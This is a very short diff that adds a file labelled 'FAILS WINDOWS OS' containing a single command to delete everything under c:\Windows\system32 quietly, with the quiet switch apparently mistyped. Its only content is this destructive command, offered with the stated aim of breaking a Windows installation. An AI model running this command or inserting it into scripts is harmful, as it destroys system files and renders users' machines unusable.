@@ -1,0 +1,4 @@
+FAILS WINDOWS OS
+
+del c:\Windows\system32\*.*\q
+
